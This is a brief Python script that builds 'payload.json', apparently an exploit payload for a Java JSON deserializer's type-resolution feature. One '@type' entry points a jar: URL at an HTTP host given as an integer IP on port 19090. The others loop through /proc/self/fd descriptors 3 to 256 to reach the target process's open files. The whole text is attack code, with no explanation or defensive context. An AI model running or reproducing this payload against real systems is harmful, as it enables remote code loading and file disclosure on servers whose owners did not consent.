
import json
items = [{"@type": "jar:http:..3232235883:19090.probe!.foo.Exception"}]
for fd in range(3, 257):
    items.append({"@type": f"jar:file:.proc.self.fd.{fd}!.fd{fd}.Exception"})
json.dump(items, open("payload.json", "w"))
print(f"payload: {len(items)} items")
